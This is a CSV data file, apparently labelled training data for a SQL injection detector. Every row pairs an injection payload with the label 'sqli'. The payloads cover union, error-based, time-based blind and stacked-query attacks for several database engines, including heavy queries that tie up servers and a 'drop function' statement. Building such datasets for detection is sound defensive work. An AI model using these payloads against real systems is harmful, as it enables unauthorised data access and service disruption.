payload,attack_type,label
(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(7992=7992)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)),sqli,1
"1'))asypgzwhere8704=8704;selectbenchmark(5000000,md5(0x4c4d6142))--",sqli,1
"1))unionallselectnull,null,null,null,null,null,null#",sqli,1
"1"")));selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdualand(((""mofa""like""mofa",sqli,1
"1%""))unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1'));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5and(('zdkn'='zdkn",sqli,1
"1')where1027=1027and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"1""and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and""epxq""like""epxq",sqli,1
"1%')unionallselectnull,null,null#",sqli,1
"1'))andmake_set(8403=8403,8899)and(('sxgl'='sxgl",sqli,1
"1)where5234=5234or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
1'rlike(select*from(select(sleep(5)))sgvo)and'mabd'='mabd,sqli,1
"1'||(select'nfgq'where1837=1837andchar(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%"")))or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(((""%""=""",sqli,1
"1"")asupynwhere6185=6185unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
-1866'))ascwtvwhere3295=3295orderby1--,sqli,1
"1'))asnxhpwhere2649=2649or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
1'where1017=1017and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"1%'or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and'%'='",sqli,1
"1%"")and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(""%""=""",sqli,1
"1')))or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"-2168)unionallselect4980,4980,4980,4980,4980,4980,4980,4980,4980--",sqli,1
"1""))and(3020=3020)*6703and((""njdx""like""njdx",sqli,1
"1""))asdunywhere3756=3756or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
-9148)where2027=2027or8571=8571--,sqli,1
"1"")))or8466=benchmark(5000000,md5(0x694a4745))and(((""ijag""=""ijag",sqli,1
"1%"";selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"-3270""where2144=2144or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"1""orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)",sqli,1
"1'))or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(('ykoz'='ykoz",sqli,1
"1)orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and(5621=5621",sqli,1
"1%""))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((""%""=""",sqli,1
1'+(select'kicv'where1976=1976and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual))+',sqli,1
"1"")));iif(1718=5436,1,1/0)",sqli,1
-4173')or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and('jdwt'like'jdwt,sqli,1
"1"")asdezrwhere2145=2145orsleep(5)#",sqli,1
1where8921=8921rlike(select*from(select(sleep(5)))sgvo)--,sqli,1
"1"")))and(select*from(select(sleep(5)))fzno)and(((""uncg""=""uncg",sqli,1
"1"")or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(""eeye""=""eeye",sqli,1
"1%""))andelt(7633=4110,4110)and((""%""=""",sqli,1
"1'or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1
"1,(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(9693=9693,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))",sqli,1
1))asogcvwhere4396=4396;if(7899=7899)select7899elsedropfunctionzbbp--,sqli,1
"1)asbhdjwhere4472=4472;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%"")))orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)and(((""%""=""",sqli,1
1'))asjbcdwhere9078=9078and6969=(select6969frompg_sleep(5))--,sqli,1
"1'||(select'fmss'fromdualwhere7025=7025or8421=(selectcount(*)fromgenerate_series(1,5000000)))||'",sqli,1
"-4728""))asndriwhere3278=3278ormake_set(9354=9354,7185)--",sqli,1
"1')))andmake_set(8403=8403,8899)and((('zxon'like'zxon",sqli,1
"1"")or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1'and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1'));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4and(('vjdk'like'vjdk",sqli,1
-5774'where3632=3632or(3177=4222)*4222--,sqli,1
1'+(selectgthpwhere7311=7311orsleep(5)#,sqli,1
"1where3799=3799andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1""))or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and((""lide""=""lide",sqli,1
-3867%')or3084=5633and('%'=',sqli,1
"1'||(select'rqzu'fromdualwhere9516=9516orelt(5873=5873,sleep(5))#",sqli,1
"-3933')))unionallselect6198,6198,6198,6198,6198#",sqli,1
"1'+(select'yzxc'where5230=5230(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0))))+'",sqli,1
"1"")))or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(((""abcw""=""abcw",sqli,1
"1)askhkvwhere2944=2944and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"-2610%"")unionallselect7779,7779,7779,7779,7779--",sqli,1
"1%')))and8407=(selectcount(*)fromgenerate_series(1,5000000))and((('%'='",sqli,1
"1'or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and'eomt'='eomt",sqli,1
"1,(select(casewhen(6750=6750)then1else6750*(select6750frominformation_schema.character_sets)end))",sqli,1
"1,iif(6333=1227,1,1/0)",sqli,1
1))and(4169=9887)*9887and((1137=1137,sqli,1
"1%"")orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(""%""=""",sqli,1
"1where4448=4448unionallselectnull,null,null,null,null#",sqli,1
"1""where4183=4183unionallselectnull,null,null,null,null,null--",sqli,1
"-2898""where3301=3301unionallselect3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",sqli,1
"-5322""unionallselect6494,6494,6494,6494,6494,6494--",sqli,1
-4595')where4892=4892orderby1--,sqli,1
"1'))and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(('ykxz'='ykxz",sqli,1
-8397')))or2171=4788,sqli,1
"1"")))andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(((""htyi""=""htyi",sqli,1
"-6772""))or9323=9323#",sqli,1
"1)and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and(8529=8529",sqli,1
1')and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual),sqli,1
"1')and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and('hfxu'like'hfxu",sqli,1
1)or4240=(select4240frompg_sleep(5))--,sqli,1
(select(casewhen(6581=6581)then1elsecast(1asint)/(select0fromdual)end)fromdual),sqli,1
"-4418""or6872=6872and""gbut""=""gbut",sqli,1
"1'+(select'jfir'where7814=7814and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610))))+'",sqli,1
"1"")aswvxtwhere7321=7321and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
-9826where4103=4103orderby1#,sqli,1
"1"")and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(""pfea""=""pfea",sqli,1
"1"")where2088=2088unionallselectnull,null,null,null--",sqli,1
"1'||(select'zoqo'fromdualwhere2063=2063;selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
1))orderby1--,sqli,1
"1)where7684=7684andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1')and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)",sqli,1
"1%')))orelt(5873=5873,sleep(5))#",sqli,1
1'inbooleanmode)unionallselectnull#,sqli,1
"1'))asbedqwhere8781=8781or8466=benchmark(5000000,md5(0x694a4745))--",sqli,1
1rlike(select*from(select(sleep(5)))sgvo)--saxs,sqli,1
"1"")))and8407=(selectcount(*)fromgenerate_series(1,5000000))and(((""ynwr""like""ynwr",sqli,1
"1""))asljhzwhere2416=2416;begindbms_lock.sleep(5);end--",sqli,1
"-5360'where8178=8178unionallselect8178,8178,8178--",sqli,1
"-9160')unionallselect8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",sqli,1
1)where9552=9552and1961=6333--,sqli,1
"1"";selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1)where5944=5944and(4446=8843)*8843--,sqli,1
"1'orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and'kjfm'='kjfm",sqli,1
"1""))asoxrrwhere6141=6141or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
-3431%')or9323=9323#,sqli,1
"1"";selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4and""fkdx""like""fkdx",sqli,1
"-9398'unionallselect3998,3998,3998,3998,3998,3998,3998,3998,3998#",sqli,1
"1'))aslrnhwhere8569=8569unionallselectnull,null,null,null,null--",sqli,1
1)aszzipwhere5353=5353and3394=3092,sqli,1
(select(casewhen(6783=6783)then1else1/(select0)end)),sqli,1
"1"")or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(""bvdv""like""bvdv",sqli,1
"1')andelt(3528=3566,3566)",sqli,1
"-9871"")unionallselect9082#",sqli,1
"1"")))rlike(select*from(select(sleep(5)))sgvo)and(((""tpxo""like""tpxo",sqli,1
1where5828=5828and(3020=3020)*6703--,sqli,1
"1))andmake_set(8403=8403,8899)and((4686=4686",sqli,1
"-4866"")aseyrqwhere8365=8365or1898=8320#",sqli,1
1or6793=(select6793frompg_sleep(5)),sqli,1
"1%"")or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and(""%""=""",sqli,1
"1%'))orelt(5873=5873,sleep(5))#",sqli,1
1');begindbms_lock.sleep(5);endand('jzlr'='jzlr,sqli,1
"1')procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and('rxxb'='rxxb",sqli,1
1'))aseymgwhere7000=7000;select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#,sqli,1
"1'))orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and(('gydh'='gydh",sqli,1
"1%""))(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)and((""%""=""",sqli,1
-8301')))or(5708=5268)*5268and((('hkha'='hkha,sqli,1
"1';selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"1%""and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1"")))unionallselectnull,null,null,null,null,null,null--",sqli,1
"1where7254=7254;createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
"1'))or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(('niro'='niro",sqli,1
"-5425where5933=5933unionallselect5933,5933,5933--",sqli,1
"-8093""))asoboiwhere1476=1476unionallselect1476,1476,1476,1476#",sqli,1
1))or4240=(select4240frompg_sleep(5))--,sqli,1
"1""or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and""vwep""like""vwep",sqli,1
1')));select(casewhen(4660=4660)then4660elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"1where9072=9072andelt(4249=4249,7259)--",sqli,1
"1%"")(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)and(""%""=""",sqli,1
1'));select(casewhen(5418=6516)then1else5418*(select5418frommaster..sysdatabases)end)--,sqli,1
"1%"")and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(""%""=""",sqli,1
"-5672'))unionallselect9371,9371,9371,9371,9371,9371--",sqli,1
"1"")asuynswhere4751=4751and(select*from(select(sleep(5)))fzno)--",sqli,1
1'+(select'ymgm'where8204=8204andsleep(5)#,sqli,1
"-8924))asjybrwhere7901=7901orelt(1032=1032,3623)--",sqli,1
"1)or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)",sqli,1
"1""));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
"1'unionallselectnull,null,null,null,null--",sqli,1
"1"")asxwnuwhere6490=6490unionallselectnull,null,null,null,null,null--",sqli,1
-7773'or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq'),sqli,1
"1"")where1330=1330or(select*from(select(sleep(5)))ydpu)--",sqli,1
"1"")andmake_set(8403=8403,8899)and(""akha""like""akha",sqli,1
-4644or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')#upwd,sqli,1
"1"");beginuser_lock.sleep(5);end--",sqli,1
"-8633""or5099=5974",sqli,1
1%'unionallselectnull#,sqli,1
-2530%'orderby1#,sqli,1
-5020%')or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and('%'=',sqli,1
1'where1045=1045or6793=(select6793frompg_sleep(5))--,sqli,1
"1'or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and'wwwb'='wwwb",sqli,1
(select(casewhen(9856=9856)thensleep(5)else9856*(select9856frominformation_schema.character_sets)end)),sqli,1
"1'+(select'mdiu'where4443=4443;selectbenchmark(5000000,md5(0x4c4d6142)))+'",sqli,1
1')where1645=1645rlikesleep(5)--,sqli,1
1));waitfordelay'0:0:5'--,sqli,1
"1')))orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and((('swua'like'swua",sqli,1
"1"")(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)and(""mrsl""=""mrsl",sqli,1
"1""or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and""bkoq""=""bkoq",sqli,1
1'))asqpaiwhere2619=2619;(select*from(select(sleep(5)))acdk)#,sqli,1
"-9178where2253=2253unionallselect2253,2253,2253,2253,2253,2253,2253,2253#",sqli,1
1)))and8990=4775and(((1894=1894,sqli,1
"1'+(select'plcm'where2141=2141andelt(3114=3114,sleep(5))#",sqli,1
"1"";selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5",sqli,1
1')and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and('izyf'='izyf,sqli,1
1%')orsleep(5)and('%'=',sqli,1
1'))and8594=(select8594frompg_sleep(5))--,sqli,1
"-1922%')unionallselect2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",sqli,1
1')where3636=3636or4240=(select4240frompg_sleep(5))--,sqli,1
-7111'or(8459=8459)*4906,sqli,1
"1""where9342=9342and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')--",sqli,1
"1""))and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and((""auyv""=""auyv",sqli,1
"1'where5004=5004or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1"")))rlike(select*from(select(sleep(5)))vwyq)#",sqli,1
"1%""))or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
1')rlike(select(casewhen(9308=2540)then1else0x28end))and('rghd'='rghd,sqli,1
"1"");createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and(""zsjw""like""zsjw",sqli,1
"1))asaeatwhere1007=1007and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1and8407=(selectcount(*)fromgenerate_series(1,5000000))--zozj",sqli,1
-9087or3038=3038,sqli,1
"1'where4701=4701androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)--",sqli,1
"1'+(select'ejox'where2719=2719unionallselectnull,null,null#",sqli,1
"1')))andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and((('cenk'='cenk",sqli,1
"1')))andmake_set(8403=8403,8899)and((('llfp'='llfp",sqli,1
"1%')));callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1')where4778=4778andelt(3114=3114,sleep(5))#",sqli,1
"1'+(select'mxei'where7811=7811andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
1';if(8537=7034)select8537elsedropfunctionvqmp--,sqli,1
"1'||(select'adiv'fromdualwhere9842=9842and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",sqli,1
"1'inbooleanmode);selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
-5147or(8459=8459)*4906,sqli,1
"1""));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"1""andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)",sqli,1
"1',(casewhen5204=2136then1elsenullend)",sqli,1
"1;selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"1"")))rlike(select(casewhen(6915=4531)then1else0x28end))and(((""jzzu""=""jzzu",sqli,1
"1'inbooleanmode);callregexp_substring(repeat(right(char(3702),0),500000000),null)#",sqli,1
-5534or1983=5721#,sqli,1
1))astrinwhere8843=8843;select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#,sqli,1
"1"")and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(""rvub""like""rvub",sqli,1
"1%'))andelt(3114=3114,sleep(5))#",sqli,1
1'+(selectplhkwhere6540=6540;select(casewhen(8403=7151)then8403elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
1');if(8858=5680)select8858elsedropfunctionpyuo--,sqli,1
1')asxqbqwhere1619=1619and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')--,sqli,1
"1'))asxebqwhere7959=7959unionallselectnull,null,null,null,null,null#",sqli,1
"1"")))procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1"")asobbkwhere6414=6414and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"1%"")or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"-2246""))unionallselect4613,4613,4613,4613,4613,4613#",sqli,1
"1)));select*fromgenerate_series(7724,7724,casewhen(7724=8170)then1else0end)limit1--",sqli,1
1');(select*from(select(sleep(5)))srmq)and('kerg'like'kerg,sqli,1
"1%""orderby1--",sqli,1
"1))ascbdxwhere8998=8998andelt(4249=4249,7259)--",sqli,1
"-4033'))or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(('ouup'='ouup",sqli,1
1where6523=6523and8594=(select8594frompg_sleep(5))--,sqli,1
"1,(select(casewhen(8392=8404)then1else8392*(select8392frominformation_schema.character_sets)end))",sqli,1
1)))orsleep(5)#,sqli,1
1%')and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and('%'=',sqli,1
"1'or8466=benchmark(5000000,md5(0x694a4745))and'ntaw'='ntaw",sqli,1
"1%"")))and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(((""%""=""",sqli,1
"-7700%')unionallselect5660,5660,5660,5660,5660,5660,5660,5660,5660#",sqli,1
"-7797'+(selectoulrwhere7091=7091unionallselect7091,7091,7091,7091,7091,7091,7091,7091,7091#",sqli,1
"1'||(select'kgfu'fromdualwhere2607=2607and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1"");selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1)))or8421=(selectcount(*)fromgenerate_series(1,5000000))and(((5340=5340",sqli,1
"1)and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1
"-8923'+(selectxgvzwhere9858=9858unionallselect9858,9858,9858#",sqli,1
"1"")androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and(""hybu""like""hybu",sqli,1
"-8982'+(selectanydwhere5358=5358unionallselect5358,5358,5358,5358,5358,5358#",sqli,1
"1'andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and'bpbe'like'bpbe",sqli,1
1'and5967=4184#,sqli,1
"1""));selectcount(*)fromgenerate_series(1,5000000)and((""bhmu""like""bhmu",sqli,1
"1'and6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1
"-5832"")or1650=9011--",sqli,1
"1,(select(casewhen(5141=5141)then(ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)))else5141/(select0from(values(0)))end)from(values(0)))",sqli,1
"1)where6424=6424;selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"1')where9454=9454andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"-6194""or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1
"1,extractvalue(9788,concat(0x5c,0x7171706a71,(select(elt(9788=9788,1))),0x717a767a71))",sqli,1
"-7656"")))unionallselect3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",sqli,1
1')))and3602=1990#,sqli,1
"1')));select*fromgenerate_series(7754,7754,casewhen(7754=1252)then1else0end)limit1--",sqli,1
"1%""and(select*from(select(sleep(5)))fzno)and""%""=""",sqli,1
"1'procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and'ctac'like'ctac",sqli,1
"-9904""))unionallselect9080,9080,9080,9080,9080--",sqli,1
"1');selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-9379)ormake_set(9354=9354,7185)and(9212=9212",sqli,1
"1"")and4760=2922",sqli,1
"1%')(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and('%'='",sqli,1
